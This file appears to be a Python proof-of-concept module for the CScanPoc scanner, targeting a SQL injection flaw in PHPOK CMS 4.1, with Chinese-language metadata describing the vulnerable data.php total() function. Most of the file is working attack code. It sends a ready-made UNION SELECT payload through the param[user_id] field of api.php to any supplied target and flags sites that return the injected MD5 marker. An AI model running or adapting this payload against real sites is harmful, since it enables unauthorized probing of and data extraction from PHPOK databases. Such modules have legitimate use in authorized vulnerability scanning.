# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random


class Vuln(ABVuln):
    vuln_id = 'PHPOK_0011'  # 平台漏洞编号，留空
    name = 'PHPOKCMS 4.1版SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-11-13'  # 漏洞公布时间
    desc = '''
        PHPOK是一套允许用户高度自由配置的企业站程序，基于LGPL协议开源授权。
        PHPOK系统在前台获取“文章总数”的功能实现上存在SQL注入漏洞。
        漏洞文件：处理数据的data_model类/framework/model/data.php
        漏洞函数：获取“文章总数”的total($rs)函数
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1890/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPOK'  # 漏洞应用名称
    product_version = '4.x'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '759b5306-ee63-4aab-903c-034fcec14f1a'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/api.php?c=api&f=phpok&id=_total&param[pid]=42&param[user_id]=0)UNION+SELECT+concat(md5(c),0x5e,version())LIMIT+1,1%23"
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
